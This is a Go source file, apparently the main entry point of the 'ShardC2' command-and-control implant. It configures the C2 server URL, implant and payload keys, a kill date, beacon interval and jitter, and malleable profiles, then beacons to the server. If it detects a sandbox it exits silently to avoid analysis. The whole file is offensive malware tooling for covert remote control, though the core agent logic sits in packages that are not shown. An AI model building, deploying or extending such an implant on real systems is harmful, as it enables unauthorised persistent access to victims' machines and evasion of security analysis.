package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/shardc2/shardc2/internal/agent"
	"github.com/shardc2/shardc2/pkg/crypto"
	"github.com/shardc2/shardc2/pkg/profiles"
)

var (
	buildServerURL  string
	buildImplantKey string
	buildPayloadKey string
	buildKillDate   string
)

func main() {
	var (
		serverURL  = flag.String("server", envOrDefault("SHARDC2_SERVER", buildServerURL), "C2 server URL")
		implantKey = flag.String("implant-key", envOrDefault("SHARDC2_IMPLANT_KEY", buildImplantKey), "Implant authentication key")
		payloadKey = flag.String("payload-key", envOrDefault("SHARDC2_PAYLOAD_KEY", buildPayloadKey), "Payload encryption key (hex)")
		killDate   = flag.String("kill-date", envOrDefault("SHARDC2_KILL_DATE", buildKillDate), "Agent kill date (RFC3339)")
		caCert     = flag.String("ca-cert", "", "CA certificate for TLS verification")
		interval   = flag.Duration("interval", 5*time.Minute, "Beacon interval")
		jitter     = flag.Duration("jitter", 60*time.Second, "Max beacon jitter")
		daemon         = flag.Bool("daemon", false, "Run in daemon mode (suppress banner)")
		ignoreSandbox  = flag.Bool("ignore-sandbox", false, "Skip sandbox detection checks")
		profileName    = flag.String("profile", "default", "Malleable C2 profile name")
	)
	flag.Parse()

	if !*daemon {
		fmt.Println("[*] ShardC2 Agent starting...")
	}

	if *serverURL == "" {
		log.Fatal("[-] Server URL required (--server or SHARDC2_SERVER)")
	}
	if *implantKey == "" {
		log.Fatal("[-] Implant key required (--implant-key or SHARDC2_IMPLANT_KEY)")
	}

	if !*ignoreSandbox {
		indicators := agent.CheckSandbox()
		if indicators.IsSuspicious() {
			if !*daemon {
				log.Printf("[!] Sandbox detected (%d indicators), exiting", indicators.Suspicious)
			}
			os.Exit(0)
		}
	}

	var payloadKeyBytes []byte
	if *payloadKey != "" {
		var err error
		payloadKeyBytes, err = crypto.ParseHexKey(*payloadKey)
		if err != nil {
			payloadKeyBytes = crypto.DeriveKey(*payloadKey)
		}
	}

	var kd time.Time
	if *killDate != "" {
		if parsed, err := time.Parse(time.RFC3339, *killDate); err == nil {
			kd = parsed
		}
	}

	profile, _ := profiles.Load(*profileName)
	if profile == nil {
		profile = profiles.Default()
	}

	cfg := agent.Config{
		ServerURL:  *serverURL,
		ImplantKey: *implantKey,
		PayloadKey: payloadKeyBytes,
		CACert:     *caCert,
		Interval:   *interval,
		Jitter:     *jitter,
		KillDate:   kd,
		Profile:    profile,
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-quit
		log.Println("[*] Signal received, shutting down...")
		cancel()
	}()

	a := agent.New(cfg)
	if err := a.Run(ctx); err != nil && ctx.Err() == nil {
		log.Fatalf("[-] Agent error: %v", err)
	}
}

func envOrDefault(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}
